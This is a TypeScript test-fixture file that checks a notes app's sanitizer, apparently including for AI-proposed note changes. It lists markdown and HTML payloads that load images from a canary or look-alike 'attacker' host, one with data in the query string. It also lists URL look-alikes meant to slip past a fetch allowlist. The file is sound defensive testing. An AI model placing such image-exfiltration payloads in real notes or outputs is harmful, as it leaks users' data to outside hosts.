import { expect } from 'vitest';

import { isStoredImageUrl, STORED_IMAGE_HOST } from '@knowtis/shared-util';

import type { ProposedMutation } from '../domain/proposed-mutation';
import { CANARY_HOSTNAME } from './canary-host';

/** An image the blob store did store, which every sanitizer must keep. */
export const STORED_IMAGE_URL = `https://${STORED_IMAGE_HOST}/notes/fixture/kept.webp`;

const LEAK_URL = `https://${CANARY_HOSTNAME}/i.png?d=trip-budget`;

export interface NamedPayload {
  readonly name: string;
  readonly markdown: string;
}

/** Note bodies that try to make a stored note load an image from outside the blob store. */
export const FOREIGN_IMAGE_PAYLOADS: readonly NamedPayload[] = [
  { name: 'markdown image', markdown: `![chart](${LEAK_URL})` },
  {
    name: 'markdown image with a caption',
    markdown: `![chart](${LEAK_URL} "Budget")`,
  },
  {
    name: 'reference-style image',
    markdown: `![chart][budget]\n\n[budget]: ${LEAK_URL}`,
  },
  { name: 'raw img', markdown: `<img src="${LEAK_URL}" alt="chart">` },
  {
    name: 'srcset beside a stored src',
    markdown: `<img src="${STORED_IMAGE_URL}" srcset="${LEAK_URL} 2x" alt="chart">`,
  },
  { name: 'svg image', markdown: `<svg><image href="${LEAK_URL}" /></svg>` },
  {
    name: 'style url()',
    markdown: `<p style="background-image:url(${LEAK_URL})">Budget</p>`,
  },
  {
    name: 'protocol-relative',
    markdown: `![chart](//${CANARY_HOSTNAME}/i.png)`,
  },
  { name: 'relative proxy path', markdown: '![chart](/t/x)' },
  {
    name: 'data URI',
    markdown: '![chart](data:image/svg+xml;base64,PHN2Zy8+)',
  },
  {
    name: 'stored host over http',
    markdown: `![chart](http://${STORED_IMAGE_HOST}/notes/a.webp)`,
  },
  {
    name: 'stored host on another port',
    markdown: `![chart](https://${STORED_IMAGE_HOST}:8443/notes/a.webp)`,
  },
  {
    name: 'look-alike blob store host',
    markdown:
      '![chart](https://attacker.public.blob.vercel-storage.com/notes/a.webp)',
  },
  {
    name: 'stored host as userinfo',
    markdown: `![chart](https://${STORED_IMAGE_HOST}@${CANARY_HOSTNAME}/a.webp)`,
  },
  {
    name: 'stored host as a subdomain',
    markdown: `![chart](https://${STORED_IMAGE_HOST}.${CANARY_HOSTNAME}/a.webp)`,
  },
  {
    name: 'upper-case scheme and host',
    markdown: `![chart](HTTPS://${CANARY_HOSTNAME.toUpperCase()}/i.png)`,
  },
  {
    name: 'entity-encoded scheme',
    markdown: `<img src="https&#58;//${CANARY_HOSTNAME}/i.png">`,
  },
  {
    name: 'backslash authority',
    markdown: `![chart](https:\\\\${CANARY_HOSTNAME}/i.png)`,
  },
];

const OPENING_TAG = /<[a-z][^>]*>/gi;
const IMAGE_TAG = /^<img\b/i;
const SRC_ATTRIBUTE = /\bsrc\s*=\s*"([^"]*)"/i;
const OTHER_IMAGE_CARRIER = /^<(?:svg|image)\b|\b(?:srcset|style)\s*=|url\(/i;

/**
 * Every image reference in sanitized HTML: the src of each `<img>` (empty when it has none) and
 * every other tag that could load an image. Only real tags count, so markup the renderer escaped
 * into text is not mistaken for an image.
 */
export function imageReferencesIn(html: string): string[] {
  const tags = html.match(OPENING_TAG) ?? [];
  return [
    ...tags
      .filter((tag) => IMAGE_TAG.test(tag))
      .map((tag) => SRC_ATTRIBUTE.exec(tag)?.[1] ?? ''),
    ...tags.filter((tag) => OTHER_IMAGE_CARRIER.test(tag)),
  ];
}

/** Fails unless `html` shows {@link STORED_IMAGE_URL} and loads no image from anywhere else. */
export function expectOnlyStoredImages(html: string): void {
  const references = imageReferencesIn(html);
  expect(references).toContain(STORED_IMAGE_URL);
  expect(
    references.filter((reference) => !isStoredImageUrl(reference))
  ).toEqual([]);
}

/** The note body a create or update proposal would store; throws for a share, which stores none. */
export function contentHtmlOf(proposal: ProposedMutation | undefined): string {
  if (proposal?.kind === 'create') {
    return proposal.payload.contentHtml;
  }
  if (
    proposal?.kind === 'update' &&
    proposal.payload.contentHtml !== undefined
  ) {
    return proposal.payload.contentHtml;
  }
  throw new Error(
    `expected a proposal with a note body, got ${proposal?.kind}`
  );
}

/** Spellings of `allowed` that name a different resource, so a fetch allowlist holding `allowed` must refuse each. */
export function urlLookalikes(allowed: string): string[] {
  const url = new URL(allowed);
  const path = `${url.pathname}${url.search}`;
  return [
    `${allowed}?d=trip-budget`,
    `${allowed}#trip-budget`,
    `${url.origin}${url.pathname}/../../trip-budget`,
    `${url.origin}${url.pathname}/`,
    `${url.origin}${url.pathname.toUpperCase()}`,
    `http://${url.host}${path}`,
    `https://${url.hostname}:8443${path}`,
    `https://${url.hostname}.${CANARY_HOSTNAME}${path}`,
    `https://${url.hostname}@${CANARY_HOSTNAME}${path}`,
    `https://${CANARY_HOSTNAME}/?u=${encodeURIComponent(allowed)}`,
  ];
}
